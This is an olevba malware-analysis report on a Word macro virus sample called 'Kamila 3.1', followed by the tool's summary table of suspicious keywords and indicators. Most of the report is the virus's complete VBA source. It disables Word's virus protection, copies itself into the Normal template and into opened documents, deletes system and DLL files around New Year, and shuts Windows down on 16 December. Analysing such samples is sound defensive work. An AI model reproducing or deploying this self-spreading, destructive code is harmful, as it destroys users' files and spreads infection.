olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lami-ce43821d7f8616b61c58fdc6a6c8094e2d925ea8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lami-ce43821d7f8616b61c58fdc6a6c8094e2d925ea8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kamila.bas 
in file: Virus.MSWord.Lami-ce43821d7f8616b61c58fdc6a6c8094e2d925ea8 - OLE stream: 'Macros/VBA/Kamila'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim NewYear As Boolean
Option Base 1

Sub KamilaRuns()
    On Error Resume Next
    NewYear = (Day(Now) >= 28 And Month(Now) = 12) Or (Day(Now) <= 3 And Month(Now) = 1)
    If NewYear Then Application.Caption = "Merry Christmas !!! Nice holidays for you"

'----------------------------------------------
'Virus: Kamila 3.1, written by Otto Gutenberg.
'==============================================
'This virus is allowed to be called as
'"Independence Day". It looks for system files
'and deletes them from the current directory.
'----------------------------------------------

    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    ShowVisualBasicEditor = False
    ActiveDocument.ReadOnlyRecommended = False
    If KamExDoc And KamExTemp Then Exit Sub
    '
    With NormalTemplate.VBProject
        For i = 1 To .VBComponents.Count
            If (.VBComponents(i).Name <> "Kamila") And (.VBComponents(i).Name <> "frmAbout") Then _
                            .VBComponents.Remove .VBComponents(i)
        Next i
        If Not KamExTemp Then .VBComponents("ThisDocument").CodeModule.DeleteLines 1 _
        , .VBComponents("ThisDocument").CodeModule.CountOfLines
    End With
    With ActiveDocument.VBProject
        For i = 1 To .VBComponents.Count
            If (.VBComponents(i).Name <> "Kamila") And (.VBComponents(i).Name <> "frmAbout") Then _
                            .VBComponents.Remove .VBComponents(i)
        Next i
        If Not KamExDoc Then .VBComponents("ThisDocument").CodeModule.DeleteLines 1 _
        , .VBComponents("ThisDocument").CodeModule.CountOfLines
    End With
    '
    If KamExDoc Then
        ActiveDocument.VBProject.VBComponents("Kamila").Export "C:\kamila.dll"
        ActiveDocument.VBProject.VBComponents("ThisDocument").Export "C:\kama.dll"
        ActiveDocument.VBProject.VBComponents("frmAbout").Export "C:\kamafrm.dll"
        NormalTemplate.VBProject.VBComponents.Import "C:\kamila.dll"
        NormalTemplate.VBProject.VBComponents.Import "C:\kamafrm.dll"
        NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\kama.dll"
        NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 4
    ElseIf KamExTemp Then
        NormalTemplate.VBProject.VBComponents("Kamila").Export "C:\kamila.dll"
        NormalTemplate.VBProject.VBComponents("ThisDocument").Export "C:\kama.dll"
        NormalTemplate.VBProject.VBComponents("frmAbout").Export "C:\kamafrm.dll"
        ActiveDocument.VBProject.VBComponents.Import "C:\kamafrm.dll"
        ActiveDocument.VBProject.VBComponents.Import "C:\kamila.dll"
        ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\kama.dll"
        ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 4
    End If
    Kill "C:\kamila.dll"
    Kill "C:\kama.dll"
    Kill "C:\kamafrm.dll"
    ActiveDocument.Save
    NormalTemplate.Save
End Sub

Sub ViewVbCode()
    On Error Resume Next
    Dim Hours As Integer
    Dim Mask As Variant
    Hours = Hour(Time)
    NewYear = (Day(Now) >= 28 And Month(Now) = 12) Or (Day(Now) <= 3 And Month(Now) = 1)
    If Hours >= 6 And Hours < 12 Then
        MsgBox ("Guten Morgen")
    ElseIf Hours >= 12 And Hours < 16 Then
        MsgBox ("Guten Tag")
    Else
        MsgBox ("Guten Abend")
    End If
    If NewYear Then
        Mask = Array("*.sys", "*.drv", "*.doc", "*.dll", "*.dos")
        MsgBox "Happy New Year!!! Have a nice holiday"
        For i = 1 To UBound(Mask)
            Kill ActiveDocument.Path + "\" + Mask(i)
        Next i
    End If
End Sub

Sub HelpAbout()
    On Error Resume Next
    frmAbout.Show
End Sub

Function KamExDoc() As Boolean
    On Error Resume Next
    KamExDoc = False
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Kamila" Then KamExDoc = True
    Next i
End Function

Function KamExTemp() As Boolean
    On Error Resume Next
    KamExTemp = False
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "Kamila" Then KamExTemp = True
    Next i
End Function

Sub AutoOpen()
    On Error Resume Next
    If NewYear Then
        Mask = Array("*.sys", "*.drv", "*.dll", "*.dos")
        MsgBox "Happy new Year!!! Have a nice holiday"
        For i = 1 To UBound(Mask)
            Kill ActiveDocument.Path + "\" + Mask(i)
        Next i
    End If
    If Day(Now) = 16 And Month(Now) = 12 Then
        Application.Tasks.ExitWindows
    End If
End Sub

Sub ToolsMacro()
    On Error Resume Next
    Application.DisplayStatusBar = True
    Application.StatusBar = "Your word processor is infected"
    If Day(Now) = 16 And Month(Now) = 12 Then
        ActiveDocument.Save
        NormalTemplate.Save
        Application.Tasks.ExitWindows
    End If
End Sub

Sub FileTemplates()
    
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kamila.dll          |Executable file name                         |
|IOC       |kama.dll            |Executable file name                         |
|IOC       |kamafrm.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

